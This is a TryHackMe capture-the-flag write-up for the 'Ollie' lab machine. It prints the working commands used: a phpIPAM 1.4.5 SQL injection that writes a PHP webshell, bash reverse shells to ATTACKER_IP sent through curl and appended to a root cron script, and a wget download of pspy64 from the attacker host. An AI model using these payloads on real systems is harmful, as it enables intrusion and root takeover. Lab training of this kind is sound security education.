# Ollie — TryHackMe Writeup

**Difficulty:** Medium | **OS:** Linux | **Platform:** [TryHackMe](https://tryhackme.com/room/ollie)
**Author:** [user70616E6461](https://github.com/user70616E6461)

---

## What is this machine about?

Ollie teaches you one thing above everything else: **your recon is only as good as your port scan.**

Miss a single port and you're stuck staring at a login page for hours wondering what you're doing wrong. This machine chains a hidden chatbot → stolen credentials → authenticated SQLi → RCE → password reuse → writable cron script into a clean, satisfying path from zero to root. Nothing here is overly guessy. Everything follows logically — if you look in the right places.

---

## Reconnaissance

### Step 1: Scan everything. Not just the top 1000.

This is not optional. Run the full range or you'll miss what matters.

```bash
nmap -p- --min-rate 5000 -Pn <TARGET_IP>
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
```

Port **1337** doesn't show up in a default scan. That's the whole machine hiding from you. Always use `-p-`.

### Step 2: Poke at the web app

Port 80 is running **phpIPAM v1.4.5**. Before touching the login form, spend 5 minutes reading the page source — it's generous with hints:

- `robots.txt` blocks `/immaolllieeboyyy` — classic rabbit hole, skip it
- The login form has a hidden field pre-filled with `admin' OR 1=1 -- -` — the creator is basically waving a flag saying *"SQLi is here"*
- Footer leaks the version number and a contact email
- `base href` reveals the hostname: `ollieshouse.thm`

Add it to hosts:

```bash
echo "<TARGET_IP> ollieshouse.thm" | sudo tee -a /etc/hosts
```

---

## Foothold — Port 1337 Gives You Everything

Netcat into 1337. What you find is a chatbot named Ollie who, with very little convincing, just hands you admin credentials:

```bash
nc <TARGET_IP> 1337
```

```
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? ollie
What's up, Ollie! It's been a while. What are you here for? exploit
Ya' know what? Ollie. If you can answer a question about me, I might have
something for you.

What breed of dog am I? Bulldog, Husky, Duck or Wolf? <answer>

You are correct! Let me confer with my trusted colleagues...

Username: admin
Password: <redacted>
```

There's your ticket into the phpIPAM panel. The chatbot isn't hiding it — it's practically gift-wrapping it. The only way to miss this is to never scan port 1337.

---

## Exploitation — SQLi → Webshell → Shell

### Finding the exploit

phpIPAM 1.4.5 has a known authenticated RCE. ExploitDB has it documented:

```bash
searchsploit phpipam
```

```
phpIPAM 1.4.5 - Remote Code Execution (RCE) | php/webapps/50963.py
```

The vulnerable endpoint is the BGP route mapping search:

```
/app/admin/routing/edit-bgp-mapping-search.php
```

The `subnet` parameter goes straight into a SQL query unsanitized. What makes this particularly nasty is that the MySQL user running phpIPAM has the `FILE` privilege — so a `UNION SELECT ... INTO OUTFILE` can write arbitrary files anywhere the web server has write access. Like, say, a PHP webshell into the web root.

### What the exploit actually does

Three steps under the hood:

1. Logs in with your credentials → captures the session cookie
2. Fires a `UNION SELECT` that writes a HEX-encoded webshell to `/var/www/html/evil.php`
3. Hits the file to confirm execution

The SQL payload writes this to disk:

```sql
" Union Select 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4 
INTO OUTFILE '/var/www/html/evil.php' -- -
```

That hex decodes to `<?php system($_GET["cmd"]); ?>`. Simple but effective.

### Running it

```bash
mkdir -p ~/oscp/machines/ollie/exploit
cp /usr/share/exploitdb/exploits/php/webapps/50963.py ~/oscp/machines/ollie/exploit/

python3 ~/oscp/machines/ollie/exploit/50963.py \
  -url http://ollieshouse.thm \
  -usr admin \
  -pwd '<redacted>' \
  -cmd id
```

```
[+] Login successful!
[+] Success! The shell is located at http://ollieshouse.thm/evil.php. Parameter: cmd
[+] Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Code execution confirmed. The `--shell` flag in the script has bash quoting issues, so skip it and trigger the reverse shell manually through curl:

**Listener:**
```bash
nc -nlvp 4444
```

**Trigger:**
```bash
curl "http://ollieshouse.thm/evil.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

Shell drops. Stabilize it properly before moving on:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## User Flag — The Oldest Trick in the Book

You have one password. Try it everywhere before doing anything else. Always.

```bash
su ollie
# Password: <redacted>
```

Works. Of course it does. Same password reused from the chatbot to the web panel to the system account. It happens in real engagements too — more than people admit.

```bash
cat /home/ollie/user.txt
# THM{...}
```

---

## Privilege Escalation — Root Runs a Script You Can Write To

### Finding the cron job with pspy64

`linpeas` doesn't surface anything obviously exploitable here. Switch to `pspy64` — it watches process spawns in real time without needing root, and catches things that never appear in `crontab -l`:

```bash
wget http://ATTACKER_IP:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

After a few seconds you'll see this repeating:

```
CMD: UID=0  PID=4261  | /bin/bash /usr/bin/feedme
```

Root is running `/usr/bin/feedme` on a schedule. Check the permissions:

```bash
ls -la /usr/bin/feedme
```

```
-rwxrw-r-- 1 root ollie 180 Apr 9 12:20 /usr/bin/feedme
```

Read that again: `-rwxrw-r--`. The group is `ollie`. **We are ollie. We can write to this file. Root executes it.**

This is game over.

### Exploiting it

Listener:
```bash
nc -nlvp 5555
```

Append your shell to the script:
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' >> /usr/bin/feedme
```

Wait a few seconds for the cron to fire:

```
connect to [ATTACKER_IP] from (UNKNOWN) [<TARGET_IP>]
root@hackerdog:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
# THM{...}
```

---

## Summary

| Step | Method | Result |
|------|--------|--------|
| Recon | nmap -p- | Finds hidden port 1337 |
| Port 1337 | Netcat chatbot | Admin credentials |
| phpIPAM | SQLi + INTO OUTFILE | PHP webshell |
| Webshell | curl reverse shell | www-data shell |
| Lateral move | Password reuse | User flag |
| PrivEsc | Writable root cron script | Root shell |

---

## Key Takeaways

**`-p-` is not optional.** Default nmap scans top 1000 ports. Port 1337 is not in that list. Miss it and you'll spend hours confused. Full port scan first, always.

**Read what the app tells you.** The source code had the SQLi hint baked in. The footer gave you the version. The hostname was in `base href`. The machine was talking the whole time.

**One password, multiple doors.** The chatbot credential opened the web panel *and* the system account. Whenever you find a password, test it against every surface you have — SSH, su, web logins, everything.

**pspy64 > crontab -l.** System cron jobs don't always show up for regular users. pspy64 watches the actual process table and catches what crontab hides.

---

*Machine by 0day on TryHackMe. Writeup by [user70616E6461](https://github.com/user70616E6461)*
